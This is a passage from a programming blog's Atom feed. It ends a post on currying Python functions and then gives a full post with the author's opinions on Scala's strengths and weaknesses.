</span><span class='line'>        <span class="k">return</span> <span class="n">fn</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">PartialFunc</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">argspec</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s pretty straightforward. When the parameters are complete, I construct a python statement that calls the original function with the complete argument list, and then pass the statement into an eval statement. I know evals are evil, but I can&rsquo;t find a way in Python to dynamically change the signature of the original method and make it accept a variable length argument (varargs).</p>

<p>So this is it. It&rsquo;s quite simple. Python methods can have varargs and keyword args, the situation gets a little more complicated. The thing is, both varargs and keyword args are not mandatory, so it&rsquo;s hard for the curried function to know whether the argument list has been completed&hellip;Also, if you take default values into account, it could get even more complicated.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My impression on Scala so far]]></title>
    <link href="http://kevinjqiu.github.io/2010/10/07/my-impression-on-scala-so-far/"/>
    <updated>2010-10-07T20:01:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2010/10/07/my-impression-on-scala-so-far</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been exploring Scala on and off for some time now. Here&rsquo;s my highly subjective and very limited impression of Scala.</p>

<p>What I like about Scala:</p>

<h2>0) It&rsquo;s statically-typed language.</h2>

<p>That&rsquo;s right! I don&rsquo;t care what you ninjas say. As much as I love dynamic languages, I just prefer statically typed language for big projects. The benefit of having type information is enormous for a project with a large code base. I know you have to write unit tests for it anyways, but when 80% of your unit test code is checking types, it&rsquo;s just counter-productive.</p>

<h2>1) The ability to combine functional programming style with OOP.</h2>

<p>This is what Scala is known for - a hybrid language that boasts the better in both OOP world and FP world. I&rsquo;m not a functional programming purist, but I think Scala did a good job blending the functional programming elements into OOP. Writing Scala programs, I find myself much more empowered to be able to choose from both styles where I see fit. The ability to pass functions around and apply high order functions can significantly reduce boilerplate code and visual clutter.</p>

<h2>2) The ability to create your own control flow (well, sort of).</h2>

<p>I had a <a href="http://reminiscential.wordpress.com/2010/09/29/scala-use-function-currying/">blog post</a> about how to use function curry to create a customized control flow. This is very empowering and yet, it&rsquo;s not an one-off syntactic sugar that&rsquo;s sprinkled randomly into the language like some other language would do. Customization of control flow is a result of combining generic language features (such as currying, by-name parameter, implicit conversion, etc).</p>

<h2>3) Object instead of static</h2>

<p>Scala does away with the Java static keyword. Instead, it provides &ldquo;object&rdquo; keyword to define a class that only has one instance. It has the same power as singleton design pattern, without the extra boilerplate code. (if you think implementing singleton in Java is simple, think again. Especially in the multi-threaded context). Also, you can use the same construct to define &ldquo;companion&rdquo; objects, which can be used to implement the factory pattern, and put in miscellaneous methods, implicit conversion methods and so on. Extremely powerful yet elegant.</p>

<h2>4) Operator overloading (well, sort of).</h2>

<p>OK, it&rsquo;s not exactly operator overloading - Scala allows many non-alpha-numeric characters in the method name, so operators are essentially methods. duh! if you think about it&hellip;why should + be treated any different from <code>add()</code>? Being able to use special characters in method names makes code easy to understand. However, I&rsquo;m a bit disappointed that question mark <code>?</code> cannot be used in method names&hellip;One of the things I liked about LISP is you can define a function <code>(odd? (x) (...))</code> and readers immediately know this function returns a boolean. I don&rsquo;t have to ponder whether I should name it <code>isOdd()</code> or <code>hasChildren()</code>. Anyway&hellip;</p>

<h2>5) Traits</h2>

<p>In most cases, multiple inheritance is manageable. Seems Java threw the baby out with the bath water - rejecting multiple inheritance completely. It&rsquo;s ironic that the AOP guys cracks open Java classes in the byte code level to do the &ldquo;mixins&rdquo;&hellip;With Scala, this seems to be natural.</p>

<h2>6) Built-in parser-combinator library</h2>

<p>It&rsquo;s easy to do some non-mission critical parsing using the Scala standard library. The library itself is implemented as an internal DSL such that writing parser rules feels like writing EBNF directly.</p>

<p>Here&rsquo;s what&rsquo;s not so hot for me so far:</p>

<h2>1) The generics still is obtrusive sometimes.</h2>

<p>That said, however, it&rsquo;s vastly superior than Java&rsquo;s generics system with far better type inferencing. But sometimes, you still have to write down a lot of types especially on a parameterized method. What&rsquo;s worse is because Scala is more strict than Java wrt types, you cannot ignore generic types the way you can in Java code. Moreover, because Scala runs on JVM, and because of type-erasure, you still can&rsquo;t write code such as val t = new T()&hellip;although we can&rsquo;t blame this on Scala.</p>

<h2>2) The collection library.</h2>

<p>For each collection data structure, Scala has the mutable implementation, immutable implementation, and the native Java Collection Library. If you&rsquo;re writing code that calls Java library, very often you have to wrap JCL lists/maps/sets into the Scala ones, because you want to use the nice functional features Scala provides. I&rsquo;m not smart enough to know a better solution to this, I&rsquo;m just merely pointing out a sore spot. Clojure has a very clever and elegant way of integrating JCL data structures into Clojure code, but since Clojure and Scala are vastly different, I don&rsquo;t know how relevant this is.</p>

<h2>3) Start up time</h2>

<p>One of Scala&rsquo;s goal is to be able to both scale up and scale down. Scala programs can be run as scripts by the interpreter, but it can&rsquo;t compete with Python or Ruby in terms of development turn-around time in terms of scripting. Again, this is because of the dreadful JVM startup process.</p>

<h2>4) Lack of good tooling</h2>

<p>The best Scala development environment I found so far is the Scala plugin for IntelliJ. It&rsquo;s still not great for debugging, but for coding and integration with Maven and such, it&rsquo;s great. The Eclipse plugin lags significantly, despite having built a brand new website and seemingly having more resource pour into it&hellip;I know I shouldn&rsquo;t be overly critical of a community effort, but it&rsquo;s just frustrating that it can&rsquo;t even do auto import of classes&hellip;</p>

<p>Overall, I think Scala really has the potential to become a big name in the programming language landscape. It can do everything Java can and does better. It has so much features that Java doesn&rsquo;t dare to add to keep backward compatibility or keep the language dead simple or politics or whatever reason&hellip;</p>

<p>Scala is not a hype, but in order to be adopted more rapidly, I think it needs to</p>

<ol>
<li><p>Stablize the language and core library.</p></li>
<li><p>Tooling, tooling, tooling! Seriously.</p></li>
</ol>

]]></content>
  </entry>
  
</feed>
